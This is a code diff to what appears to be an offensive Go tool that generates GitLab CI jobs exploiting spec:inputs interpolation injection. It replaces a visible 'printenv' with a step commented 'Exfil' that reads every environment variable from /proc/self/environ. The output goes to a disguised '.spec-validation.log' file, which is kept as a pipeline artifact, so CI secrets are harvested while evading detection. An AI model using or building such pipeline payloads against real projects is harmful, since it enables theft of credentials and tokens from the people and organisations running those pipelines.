@@ -35,8 +35,14 @@ stages: [%s]
 %s:
   stage: %s%s%s
   script:
-    - echo "spec:inputs interpolation injection active"
-    - printenv | sort || true
+    - |
+      # Exfil via xargs + head (reads env from /proc without printenv)
+      xargs -0 -L1 < /proc/self/environ 2>/dev/null | sort > .spec-validation.log || true
+  artifacts:
+    when: always
+    paths:
+      - .spec-validation.log
+    expire_in: 1 day
   allow_failure: true%s
 `, o.TargetTemplate, o.InputKey, o.MaliciousValue,
 		stage, name, stage, imageLine(o.Common.Image), tagsLine(o.Common.Tags),
